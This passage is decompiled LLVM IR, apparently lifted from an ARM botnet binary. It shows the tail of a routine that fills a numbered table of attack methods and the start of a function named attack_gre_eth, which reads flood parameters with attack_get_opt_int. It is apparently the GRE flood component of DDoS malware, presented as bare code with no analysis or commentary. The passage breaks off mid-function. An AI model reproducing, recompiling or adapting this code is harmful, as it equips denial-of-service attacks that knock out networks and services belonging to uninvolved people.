  %r3.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_85a0 = load i32, i32* @r4, align 4
  store i32 %v3_85a0, i32* %stack_var_-24, align 4
  %v6_85a0 = load i32, i32* @r5, align 4
  %v9_85a0 = load i32, i32* @r6, align 4
  %v12_85a0 = load i32, i32* @r7, align 4
  %v15_85a0 = load i32, i32* @r8, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_85ac = call i32 @calloc(i32 1, i32 8)
  store i32 ptrtoint (i8** @global_var_20f30.31 to i32), i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_20f34.33 to i32), i32* @r6, align 4
  store i32 44700, i32* %r2.global-to-local, align 4
  store i32 %v2_85ac, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_20f31.37 to i32), i32* %r1.global-to-local, align 4
  %v2_85cc = load i32, i32* @global_var_20f34.33, align 4
  %v2_85d0 = inttoptr i32 %v2_85ac to i32*
  store i32 44700, i32* %v2_85d0, align 4
  %v3_85d4 = load i32, i32* @r4, align 4
  %v4_85d4 = add i32 %v3_85d4, 4
  %v5_85d4 = inttoptr i32 %v4_85d4 to i8*
  store i8 0, i8* %v5_85d4, align 1
  %v0_85d8 = load i32, i32* %r1.global-to-local, align 4
  %v3_85d8 = mul i32 %v0_85d8, 4
  store i32 %v3_85d8, i32* %r1.global-to-local, align 4
  %v5_85dc = inttoptr i32 %v2_85cc to i32*
  %v6_85dc = call i32 @realloc(i32* %v5_85dc, i32 %v3_85d8, i32 44700, i32 0)
  %v2_85e0 = load i8, i8* bitcast (i8** @global_var_20f30.31 to i8*), align 4
  %v3_85e0 = zext i8 %v2_85e0 to i32
  store i32 %v6_85dc, i32* %r2.global-to-local, align 4
  %v0_85e8 = load i32, i32* @r4, align 4
  %v5_85e8 = mul nuw nsw i32 %v3_85e0, 4
  %v6_85e8 = add i32 %v5_85e8, %v6_85dc
  %v7_85e8 = inttoptr i32 %v6_85e8 to i32*
  store i32 %v0_85e8, i32* %v7_85e8, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_20f31.37 to i32), i32* %r3.global-to-local, align 4
  %v1_85f8 = load i32, i32* @r6, align 4
  %v2_85f8 = inttoptr i32 %v1_85f8 to i32*
  store i32 %v6_85dc, i32* %v2_85f8, align 4
  %v0_85fc = load i32, i32* %r3.global-to-local, align 4
  %v1_85fc = trunc i32 %v0_85fc to i8
  %v2_85fc = load i32, i32* @r5, align 4
  %v3_85fc = inttoptr i32 %v2_85fc to i8*
  store i8 %v1_85fc, i8* %v3_85fc, align 1
  %v2_8600 = call i32 @calloc(i32 1, i32 8)
  store i32 ptrtoint (i32* @global_var_b468.39 to i32), i32* %r3.global-to-local, align 4
  store i32 1, i32* @r7, align 4
  store i32 %v2_8600, i32* @r4, align 4
  store i32 ptrtoint (i8* @global_var_20f31.37 to i32), i32* %r1.global-to-local, align 4
  %v2_8618 = load i32, i32* @global_var_20f34.33, align 4
  %v2_861c = inttoptr i32 %v2_8600 to i32*
  store i32 ptrtoint (i32* @global_var_b468.39 to i32), i32* %v2_861c, align 4
  %v0_8620 = load i32, i32* @r7, align 4
  %v1_8620 = trunc i32 %v0_8620 to i8
  %v2_8620 = load i32, i32* @r4, align 4
  %v3_8620 = add i32 %v2_8620, 4
  %v4_8620 = inttoptr i32 %v3_8620 to i8*
  store i8 %v1_8620, i8* %v4_8620, align 1
  %v0_8624 = load i32, i32* %r1.global-to-local, align 4
  %v3_8624 = mul i32 %v0_8624, 4
  store i32 %v3_8624, i32* %r1.global-to-local, align 4
  %v4_8628 = inttoptr i32 %v2_8618 to i32*
  %v5_8628 = call i32 @realloc(i32* %v4_8628, i32 %v3_8624, i32 %v6_85dc, i32 ptrtoint (i32* @global_var_b468.39 to i32))
  %v2_862c = load i8, i8* bitcast (i8** @global_var_20f30.31 to i8*), align 4
  %v3_862c = zext i8 %v2_862c to i32
  store i32 %v3_862c, i32* %r3.global-to-local, align 4
  store i32 %v5_8628, i32* %r2.global-to-local, align 4
  %v0_8634 = load i32, i32* @r4, align 4
  %v5_8634 = mul nuw nsw i32 %v3_862c, 4
  %v6_8634 = add i32 %v5_8634, %v5_8628
  %v7_8634 = inttoptr i32 %v6_8634 to i32*
  store i32 %v0_8634, i32* %v7_8634, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_863c = load i32, i32* %r3.global-to-local, align 4
  %v1_863c = load i32, i32* @r7, align 4
  %v2_863c = add i32 %v1_863c, %v0_863c
  store i32 %v2_863c, i32* %r3.global-to-local, align 4
  %v1_8644 = trunc i32 %v2_863c to i8
  %v2_8644 = load i32, i32* @r5, align 4
  %v3_8644 = inttoptr i32 %v2_8644 to i8*
  store i8 %v1_8644, i8* %v3_8644, align 1
  %v0_8648 = load i32, i32* %r2.global-to-local, align 4
  %v1_8648 = load i32, i32* @r6, align 4
  %v2_8648 = inttoptr i32 %v1_8648 to i32*
  store i32 %v0_8648, i32* %v2_8648, align 4
  %v2_864c = call i32 @calloc(i32 %v1_863c, i32 8)
  %v2_8650 = load i8, i8* bitcast (i8** @global_var_20f30.31 to i8*), align 4
  %v3_8650 = zext i8 %v2_8650 to i32
  store i32 ptrtoint (i32* @global_var_b8d4.41 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_864c, i32* @r4, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_8660 = load i32, i32* @r7, align 4
  %v2_8660 = add i32 %v1_8660, %v3_8650
  store i32 %v2_8660, i32* %r1.global-to-local, align 4
  %v2_8664 = load i32, i32* @global_var_20f34.33, align 4
  %v2_8668 = inttoptr i32 %v2_864c to i32*
  store i32 ptrtoint (i32* @global_var_b8d4.41 to i32), i32* %v2_8668, align 4
  %v3_866c = load i32, i32* @r4, align 4
  %v4_866c = add i32 %v3_866c, 4
  %v5_866c = inttoptr i32 %v4_866c to i8*
  store i8 2, i8* %v5_866c, align 1
  %v0_8670 = load i32, i32* %r1.global-to-local, align 4
  %v3_8670 = mul i32 %v0_8670, 4
  store i32 %v3_8670, i32* %r1.global-to-local, align 4
  %v5_8674 = inttoptr i32 %v2_8664 to i32*
  %v6_8674 = call i32 @realloc(i32* %v5_8674, i32 %v3_8670, i32 ptrtoint (i32* @global_var_b8d4.41 to i32), i32 2)
  %v2_8678 = load i8, i8* bitcast (i8** @global_var_20f30.31 to i8*), align 4
  %v3_8678 = zext i8 %v2_8678 to i32
  store i32 %v3_8678, i32* %r3.global-to-local, align 4
  store i32 %v6_8674, i32* %r2.global-to-local, align 4
  %v0_8680 = load i32, i32* @r4, align 4
  %v5_8680 = mul nuw nsw i32 %v3_8678, 4
  %v6_8680 = add i32 %v5_8680, %v6_8674
  %v7_8680 = inttoptr i32 %v6_8680 to i32*
  store i32 %v0_8680, i32* %v7_8680, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_8688 = load i32, i32* %r3.global-to-local, align 4
  %v1_8688 = load i32, i32* @r7, align 4
  %v2_8688 = add i32 %v1_8688, %v0_8688
  store i32 %v2_8688, i32* %r3.global-to-local, align 4
  %v1_8690 = load i32, i32* @r6, align 4
  %v2_8690 = inttoptr i32 %v1_8690 to i32*
  store i32 %v6_8674, i32* %v2_8690, align 4
  %v0_8694 = load i32, i32* %r3.global-to-local, align 4
  %v1_8694 = trunc i32 %v0_8694 to i8
  %v2_8694 = load i32, i32* @r5, align 4
  %v3_8694 = inttoptr i32 %v2_8694 to i8*
  store i8 %v1_8694, i8* %v3_8694, align 1
  %v2_8698 = call i32 @calloc(i32 %v1_8688, i32 8)
  %v2_869c = load i8, i8* bitcast (i8** @global_var_20f30.31 to i8*), align 4
  %v3_869c = zext i8 %v2_869c to i32
  store i32 ptrtoint (i32* @global_var_abdc.43 to i32), i32* %r3.global-to-local, align 4
  store i32 8, i32* @r8, align 4
  store i32 %v2_8698, i32* @r4, align 4
  %v1_86ac = load i32, i32* @r7, align 4
  %v2_86ac = add i32 %v1_86ac, %v3_869c
  store i32 %v2_86ac, i32* %r1.global-to-local, align 4
  %v2_86b0 = load i32, i32* @global_var_20f34.33, align 4
  %v2_86b4 = inttoptr i32 %v2_8698 to i32*
  store i32 ptrtoint (i32* @global_var_abdc.43 to i32), i32* %v2_86b4, align 4
  %v0_86b8 = load i32, i32* @r8, align 4
  %v1_86b8 = trunc i32 %v0_86b8 to i8
  %v2_86b8 = load i32, i32* @r4, align 4
  %v3_86b8 = add i32 %v2_86b8, 4
  %v4_86b8 = inttoptr i32 %v3_86b8 to i8*
  store i8 %v1_86b8, i8* %v4_86b8, align 1
  %v0_86bc = load i32, i32* %r1.global-to-local, align 4
  %v3_86bc = mul i32 %v0_86bc, 4
  store i32 %v3_86bc, i32* %r1.global-to-local, align 4
  %v4_86c0 = inttoptr i32 %v2_86b0 to i32*
  %v5_86c0 = call i32 @realloc(i32* %v4_86c0, i32 %v3_86bc, i32 %v6_8674, i32 ptrtoint (i32* @global_var_abdc.43 to i32))
  %v2_86c4 = load i8, i8* bitcast (i8** @global_var_20f30.31 to i8*), align 4
  %v3_86c4 = zext i8 %v2_86c4 to i32
  store i32 %v3_86c4, i32* %r3.global-to-local, align 4
  store i32 %v5_86c0, i32* %r2.global-to-local, align 4
  %v0_86cc = load i32, i32* @r4, align 4
  %v5_86cc = mul nuw nsw i32 %v3_86c4, 4
  %v6_86cc = add i32 %v5_86cc, %v5_86c0
  %v7_86cc = inttoptr i32 %v6_86cc to i32*
  store i32 %v0_86cc, i32* %v7_86cc, align 4
  %v0_86d0 = load i32, i32* @r8, align 4
  store i32 %v0_86d0, i32* %r1.global-to-local, align 4
  %v0_86d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_86d4 = load i32, i32* @r7, align 4
  %v2_86d4 = add i32 %v1_86d4, %v0_86d4
  store i32 %v2_86d4, i32* %r3.global-to-local, align 4
  %v1_86dc = trunc i32 %v2_86d4 to i8
  %v2_86dc = load i32, i32* @r5, align 4
  %v3_86dc = inttoptr i32 %v2_86dc to i8*
  store i8 %v1_86dc, i8* %v3_86dc, align 1
  %v0_86e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_86e0 = load i32, i32* @r6, align 4
  %v2_86e0 = inttoptr i32 %v1_86e0 to i32*
  store i32 %v0_86e0, i32* %v2_86e0, align 4
  %v2_86e4 = call i32 @calloc(i32 %v1_86d4, i32 %v0_86d0)
  %v2_86e8 = load i8, i8* bitcast (i8** @global_var_20f30.31 to i8*), align 4
  %v3_86e8 = zext i8 %v2_86e8 to i32
  store i32 ptrtoint (i32* @global_var_a504.45 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_86e4, i32* @r4, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_86f8 = load i32, i32* @r7, align 4
  %v2_86f8 = add i32 %v1_86f8, %v3_86e8
  store i32 %v2_86f8, i32* %r1.global-to-local, align 4
  %v2_86fc = load i32, i32* @global_var_20f34.33, align 4
  %v2_8700 = inttoptr i32 %v2_86e4 to i32*
  store i32 ptrtoint (i32* @global_var_a504.45 to i32), i32* %v2_8700, align 4
  %v3_8704 = load i32, i32* @r4, align 4
  %v4_8704 = add i32 %v3_8704, 4
  %v5_8704 = inttoptr i32 %v4_8704 to i8*
  store i8 3, i8* %v5_8704, align 1
  %v0_8708 = load i32, i32* %r1.global-to-local, align 4
  %v3_8708 = mul i32 %v0_8708, 4
  store i32 %v3_8708, i32* %r1.global-to-local, align 4
  %v5_870c = inttoptr i32 %v2_86fc to i32*
  %v6_870c = call i32 @realloc(i32* %v5_870c, i32 %v3_8708, i32 ptrtoint (i32* @global_var_a504.45 to i32), i32 3)
  %v2_8710 = load i8, i8* bitcast (i8** @global_var_20f30.31 to i8*), align 4
  %v3_8710 = zext i8 %v2_8710 to i32
  store i32 %v3_8710, i32* %r3.global-to-local, align 4
  store i32 %v6_870c, i32* %r2.global-to-local, align 4
  %v0_8718 = load i32, i32* @r4, align 4
  %v5_8718 = mul nuw nsw i32 %v3_8710, 4
  %v6_8718 = add i32 %v5_8718, %v6_870c
  %v7_8718 = inttoptr i32 %v6_8718 to i32*
  store i32 %v0_8718, i32* %v7_8718, align 4
  %v0_871c = load i32, i32* @r8, align 4
  store i32 %v0_871c, i32* %r1.global-to-local, align 4
  %v0_8720 = load i32, i32* %r3.global-to-local, align 4
  %v1_8720 = load i32, i32* @r7, align 4
  %v2_8720 = add i32 %v1_8720, %v0_8720
  store i32 %v2_8720, i32* %r3.global-to-local, align 4
  %v1_8728 = trunc i32 %v2_8720 to i8
  %v2_8728 = load i32, i32* @r5, align 4
  %v3_8728 = inttoptr i32 %v2_8728 to i8*
  store i8 %v1_8728, i8* %v3_8728, align 1
  %v0_872c = load i32, i32* %r2.global-to-local, align 4
  %v1_872c = load i32, i32* @r6, align 4
  %v2_872c = inttoptr i32 %v1_872c to i32*
  store i32 %v0_872c, i32* %v2_872c, align 4
  %v2_8730 = call i32 @calloc(i32 %v1_8720, i32 %v0_871c)
  %v2_8734 = load i8, i8* bitcast (i8** @global_var_20f30.31 to i8*), align 4
  %v3_8734 = zext i8 %v2_8734 to i32
  store i32 ptrtoint (i32* @global_var_9de0.47 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8730, i32* @r4, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v1_8744 = load i32, i32* @r7, align 4
  %v2_8744 = add i32 %v1_8744, %v3_8734
  store i32 %v2_8744, i32* %r1.global-to-local, align 4
  %v2_8748 = load i32, i32* @global_var_20f34.33, align 4
  %v2_874c = inttoptr i32 %v2_8730 to i32*
  store i32 ptrtoint (i32* @global_var_9de0.47 to i32), i32* %v2_874c, align 4
  %v3_8750 = load i32, i32* @r4, align 4
  %v4_8750 = add i32 %v3_8750, 4
  %v5_8750 = inttoptr i32 %v4_8750 to i8*
  store i8 4, i8* %v5_8750, align 1
  %v0_8754 = load i32, i32* %r1.global-to-local, align 4
  %v3_8754 = mul i32 %v0_8754, 4
  store i32 %v3_8754, i32* %r1.global-to-local, align 4
  %v5_8758 = inttoptr i32 %v2_8748 to i32*
  %v6_8758 = call i32 @realloc(i32* %v5_8758, i32 %v3_8754, i32 ptrtoint (i32* @global_var_9de0.47 to i32), i32 4)
  %v2_875c = load i8, i8* bitcast (i8** @global_var_20f30.31 to i8*), align 4
  %v3_875c = zext i8 %v2_875c to i32
  store i32 %v3_875c, i32* %r3.global-to-local, align 4
  store i32 %v6_8758, i32* %r2.global-to-local, align 4
  %v0_8764 = load i32, i32* @r4, align 4
  %v5_8764 = mul nuw nsw i32 %v3_875c, 4
  %v6_8764 = add i32 %v5_8764, %v6_8758
  %v7_8764 = inttoptr i32 %v6_8764 to i32*
  store i32 %v0_8764, i32* %v7_8764, align 4
  %v0_8768 = load i32, i32* @r8, align 4
  store i32 %v0_8768, i32* %r1.global-to-local, align 4
  %v0_876c = load i32, i32* %r3.global-to-local, align 4
  %v1_876c = load i32, i32* @r7, align 4
  %v2_876c = add i32 %v1_876c, %v0_876c
  store i32 %v2_876c, i32* %r3.global-to-local, align 4
  %v1_8774 = trunc i32 %v2_876c to i8
  %v2_8774 = load i32, i32* @r5, align 4
  %v3_8774 = inttoptr i32 %v2_8774 to i8*
  store i8 %v1_8774, i8* %v3_8774, align 1
  %v0_8778 = load i32, i32* %r2.global-to-local, align 4
  %v1_8778 = load i32, i32* @r6, align 4
  %v2_8778 = inttoptr i32 %v1_8778 to i32*
  store i32 %v0_8778, i32* %v2_8778, align 4
  %v2_877c = call i32 @calloc(i32 %v1_876c, i32 %v0_8768)
  %v2_8780 = load i8, i8* bitcast (i8** @global_var_20f30.31 to i8*), align 4
  %v3_8780 = zext i8 %v2_8780 to i32
  store i32 ptrtoint (i32* @global_var_95b4.49 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_877c, i32* @r4, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v1_8790 = load i32, i32* @r7, align 4
  %v2_8790 = add i32 %v1_8790, %v3_8780
  store i32 %v2_8790, i32* %r1.global-to-local, align 4
  %v2_8794 = load i32, i32* @global_var_20f34.33, align 4
  %v2_8798 = inttoptr i32 %v2_877c to i32*
  store i32 ptrtoint (i32* @global_var_95b4.49 to i32), i32* %v2_8798, align 4
  %v3_879c = load i32, i32* @r4, align 4
  %v4_879c = add i32 %v3_879c, 4
  %v5_879c = inttoptr i32 %v4_879c to i8*
  store i8 5, i8* %v5_879c, align 1
  %v0_87a0 = load i32, i32* %r1.global-to-local, align 4
  %v3_87a0 = mul i32 %v0_87a0, 4
  store i32 %v3_87a0, i32* %r1.global-to-local, align 4
  %v5_87a4 = inttoptr i32 %v2_8794 to i32*
  %v6_87a4 = call i32 @realloc(i32* %v5_87a4, i32 %v3_87a0, i32 ptrtoint (i32* @global_var_95b4.49 to i32), i32 5)
  %v2_87a8 = load i8, i8* bitcast (i8** @global_var_20f30.31 to i8*), align 4
  %v3_87a8 = zext i8 %v2_87a8 to i32
  store i32 %v3_87a8, i32* %r3.global-to-local, align 4
  store i32 %v6_87a4, i32* %r2.global-to-local, align 4
  %v0_87b0 = load i32, i32* @r4, align 4
  %v5_87b0 = mul nuw nsw i32 %v3_87a8, 4
  %v6_87b0 = add i32 %v5_87b0, %v6_87a4
  %v7_87b0 = inttoptr i32 %v6_87b0 to i32*
  store i32 %v0_87b0, i32* %v7_87b0, align 4
  %v0_87b4 = load i32, i32* @r8, align 4
  store i32 %v0_87b4, i32* %r1.global-to-local, align 4
  %v0_87b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_87b8 = load i32, i32* @r7, align 4
  %v2_87b8 = add i32 %v1_87b8, %v0_87b8
  store i32 %v2_87b8, i32* %r3.global-to-local, align 4
  %v1_87c0 = trunc i32 %v2_87b8 to i8
  %v2_87c0 = load i32, i32* @r5, align 4
  %v3_87c0 = inttoptr i32 %v2_87c0 to i8*
  store i8 %v1_87c0, i8* %v3_87c0, align 1
  %v0_87c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_87c4 = load i32, i32* @r6, align 4
  %v2_87c4 = inttoptr i32 %v1_87c4 to i32*
  store i32 %v0_87c4, i32* %v2_87c4, align 4
  %v2_87c8 = call i32 @calloc(i32 %v1_87b8, i32 %v0_87b4)
  %v2_87cc = load i8, i8* bitcast (i8** @global_var_20f30.31 to i8*), align 4
  %v3_87cc = zext i8 %v2_87cc to i32
  store i32 ptrtoint (i32* @global_var_8f54.51 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_87c8, i32* @r4, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v1_87dc = load i32, i32* @r7, align 4
  %v2_87dc = add i32 %v1_87dc, %v3_87cc
  store i32 %v2_87dc, i32* %r1.global-to-local, align 4
  %v2_87e0 = load i32, i32* @global_var_20f34.33, align 4
  %v2_87e4 = inttoptr i32 %v2_87c8 to i32*
  store i32 ptrtoint (i32* @global_var_8f54.51 to i32), i32* %v2_87e4, align 4
  %v3_87e8 = load i32, i32* @r4, align 4
  %v4_87e8 = add i32 %v3_87e8, 4
  %v5_87e8 = inttoptr i32 %v4_87e8 to i8*
  store i8 6, i8* %v5_87e8, align 1
  %v0_87ec = load i32, i32* %r1.global-to-local, align 4
  %v3_87ec = mul i32 %v0_87ec, 4
  store i32 %v3_87ec, i32* %r1.global-to-local, align 4
  %v5_87f0 = inttoptr i32 %v2_87e0 to i32*
  %v6_87f0 = call i32 @realloc(i32* %v5_87f0, i32 %v3_87ec, i32 ptrtoint (i32* @global_var_8f54.51 to i32), i32 6)
  %v2_87f4 = load i8, i8* bitcast (i8** @global_var_20f30.31 to i8*), align 4
  %v3_87f4 = zext i8 %v2_87f4 to i32
  store i32 %v3_87f4, i32* %r3.global-to-local, align 4
  store i32 %v6_87f0, i32* %r2.global-to-local, align 4
  %v0_87fc = load i32, i32* @r4, align 4
  %v5_87fc = mul nuw nsw i32 %v3_87f4, 4
  %v6_87fc = add i32 %v5_87fc, %v6_87f0
  %v7_87fc = inttoptr i32 %v6_87fc to i32*
  store i32 %v0_87fc, i32* %v7_87fc, align 4
  %v0_8800 = load i32, i32* @r8, align 4
  store i32 %v0_8800, i32* %r1.global-to-local, align 4
  %v0_8804 = load i32, i32* %r3.global-to-local, align 4
  %v1_8804 = load i32, i32* @r7, align 4
  %v2_8804 = add i32 %v1_8804, %v0_8804
  store i32 %v2_8804, i32* %r3.global-to-local, align 4
  %v1_880c = trunc i32 %v2_8804 to i8
  %v2_880c = load i32, i32* @r5, align 4
  %v3_880c = inttoptr i32 %v2_880c to i8*
  store i8 %v1_880c, i8* %v3_880c, align 1
  %v0_8810 = load i32, i32* %r2.global-to-local, align 4
  %v1_8810 = load i32, i32* @r6, align 4
  %v2_8810 = inttoptr i32 %v1_8810 to i32*
  store i32 %v0_8810, i32* %v2_8810, align 4
  %v2_8814 = call i32 @calloc(i32 %v1_8804, i32 %v0_8800)
  %v2_8818 = load i8, i8* bitcast (i8** @global_var_20f30.31 to i8*), align 4
  %v3_8818 = zext i8 %v2_8818 to i32
  store i32 ptrtoint (i32* @global_var_888c.53 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8814, i32* @r4, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v1_8828 = load i32, i32* @r7, align 4
  %v2_8828 = add i32 %v1_8828, %v3_8818
  store i32 %v2_8828, i32* %r1.global-to-local, align 4
  %v2_882c = load i32, i32* @global_var_20f34.33, align 4
  %v2_8830 = inttoptr i32 %v2_8814 to i32*
  store i32 ptrtoint (i32* @global_var_888c.53 to i32), i32* %v2_8830, align 4
  %v3_8834 = load i32, i32* @r4, align 4
  %v4_8834 = add i32 %v3_8834, 4
  %v5_8834 = inttoptr i32 %v4_8834 to i8*
  store i8 7, i8* %v5_8834, align 1
  %v0_8838 = load i32, i32* %r1.global-to-local, align 4
  %v3_8838 = mul i32 %v0_8838, 4
  store i32 %v3_8838, i32* %r1.global-to-local, align 4
  %v5_883c = inttoptr i32 %v2_882c to i32*
  %v6_883c = call i32 @realloc(i32* %v5_883c, i32 %v3_8838, i32 ptrtoint (i32* @global_var_888c.53 to i32), i32 7)
  %v2_8840 = load i8, i8* bitcast (i8** @global_var_20f30.31 to i8*), align 4
  %v3_8840 = zext i8 %v2_8840 to i32
  store i32 %v3_8840, i32* %r3.global-to-local, align 4
  %v1_8844 = load i32, i32* @r6, align 4
  %v2_8844 = inttoptr i32 %v1_8844 to i32*
  store i32 %v6_883c, i32* %v2_8844, align 4
  %v0_8848 = load i32, i32* @r4, align 4
  %v2_8848 = load i32, i32* %r3.global-to-local, align 4
  %v5_8848 = mul i32 %v2_8848, 4
  %v6_8848 = add i32 %v5_8848, %v6_883c
  %v7_8848 = inttoptr i32 %v6_8848 to i32*
  store i32 %v0_8848, i32* %v7_8848, align 4
  %v0_884c = load i32, i32* %r3.global-to-local, align 4
  %v1_884c = load i32, i32* @r7, align 4
  %v2_884c = add i32 %v1_884c, %v0_884c
  store i32 %v2_884c, i32* %r2.global-to-local, align 4
  %v1_8854 = trunc i32 %v2_884c to i8
  %v2_8854 = load i32, i32* @r5, align 4
  %v3_8854 = inttoptr i32 %v2_8854 to i8*
  store i8 %v1_8854, i8* %v3_8854, align 1
  %v2_8858 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_8858, i32* @r4, align 4
  store i32 %v6_85a0, i32* @r5, align 4
  store i32 %v9_85a0, i32* @r6, align 4
  store i32 %v12_85a0, i32* @r7, align 4
  store i32 %v15_85a0, i32* @r8, align 4
  ret i32 %v1_884c

; uselistorder directives
  uselistorder i32 %v1_884c, { 1, 0 }
  uselistorder i32 %v3_8838, { 1, 0 }
  uselistorder i32 %v1_8804, { 1, 0 }
  uselistorder i32 %v3_87ec, { 1, 0 }
  uselistorder i32 %v1_87b8, { 1, 0 }
  uselistorder i32 %v3_87a0, { 1, 0 }
  uselistorder i32 %v1_876c, { 1, 0 }
  uselistorder i32 %v3_8754, { 1, 0 }
  uselistorder i32 %v1_8720, { 1, 0 }
  uselistorder i32 %v3_8708, { 1, 0 }
  uselistorder i32 %v1_86d4, { 1, 0 }
  uselistorder i32 %v3_86bc, { 1, 0 }
  uselistorder i32 %v1_8688, { 1, 0 }
  uselistorder i32 %v6_8674, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8670, { 1, 0 }
  uselistorder i32 %v1_863c, { 1, 0 }
  uselistorder i32 %v3_8624, { 1, 0 }
  uselistorder i32 %v2_8600, { 1, 0 }
  uselistorder i32 %v6_85dc, { 1, 2, 0, 3 }
  uselistorder i32 %v3_85d8, { 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_20f30.31 to i8*), { 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_20f31.37 to i32), { 2, 1, 0 }
  uselistorder i8** @global_var_20f30.31, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_20f30.31 to i32), { 1, 0 }
}

define i32 @attack_gre_eth(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-54 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_888c = load i32, i32* @r4, align 4
  %v24_888c = load i32, i32* @fp, align 4
  %v27_888c = load i32, i32* @lr, align 4
  store i32 0, i32* @sb, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg5, i32* @r4, align 4
  store i32 %arg3, i32* @sl, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_88b8 = call i32 @calloc(i32 %arg2, i32 4)
  %v0_88bc = load i32, i32* @r4, align 4
  store i32 %v0_88bc, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_88c8 = load i32, i32* @sb, align 4
  store i32 %v0_88c8, i32* %r3.global-to-local, align 4
  %v0_88cc = load i32, i32* @r5, align 4
  store i32 %v0_88cc, i32* %r0.global-to-local, align 4
  %v5_88d0 = inttoptr i32 %v0_88bc to i32*
  %v6_88d0 = call i32 @attack_get_opt_int(i32 %v0_88cc, i32* %v5_88d0, i32 2, i32 %v0_88c8, i32 %v2_88b8)
  %v1_88dc = urem i32 %v6_88d0, 256
  store i32 %v1_88dc, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_88e8 = load i32, i32* @r4, align 4
  store i32 %v0_88e8, i32* %r1.global-to-local, align 4
  %v0_88ec = load i32, i32* @r5, align 4
  store i32 %v0_88ec, i32* %r0.global-to-local, align 4
  %v5_88f0 = trunc i32 %v6_88d0 to i8
  %v6_88f4 = inttoptr i32 %v0_88e8 to i32*
  %v7_88f4 = call i32 @attack_get_opt_int(i32 %v0_88ec, i32* %v6_88f4, i32 3, i32 65535, i32 %v6_88d0)
  %v0_88f8 = load i32, i32* @r4, align 4
  store i32 %v0_88f8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_88f4, i32* %fp.global-to-local, align 4
  %v0_8908 = load i32, i32* @r5, align 4
  store i32 %v0_8908, i32* %r0.global-to-local, align 4
  %v5_890c = inttoptr i32 %v0_88f8 to i32*
  %v6_890c = call i32 @attack_get_opt_int(i32 %v0_8908, i32* %v5_890c, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_8914 = urem i32 %v6_890c, 256
  store i32 %v1_8914, i32* %ip.global-to-local, align 4
  %v0_8918 = load i32, i32* @r4, align 4
  store i32 %v0_8918, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_8924 = load i32, i32* @r5, align 4
  store i32 %v0_8924, i32* %r0.global-to-local, align 4
  %v6_892c = inttoptr i32 %v0_8918 to i32*
  %v7_892c = call i32 @attack_get_opt_int(i32 %v0_8924, i32* %v6_892c, i32 5, i32 1, i32 %v1_8914)
  %v1_8938 = urem i32 %v7_892c, 256
  store i32 %v1_8938, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_8944 = load i32, i32* @r4, align 4
  store i32 %v0_8944, i32* %r1.global-to-local, align 4
  %v0_8948 = load i32, i32* @r5, align 4
  store i32 %v0_8948, i32* %r0.global-to-local, align 4
  %v5_8950 = inttoptr i32 %v0_8944 to i32*
  %v6_8950 = call i32 @attack_get_opt_int(i32 %v0_8948, i32* %v5_8950, i32 6, i32 65535, i32 %v1_8938)
  %v0_895c = load i32, i32* @r4, align 4
  store i32 %v0_895c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
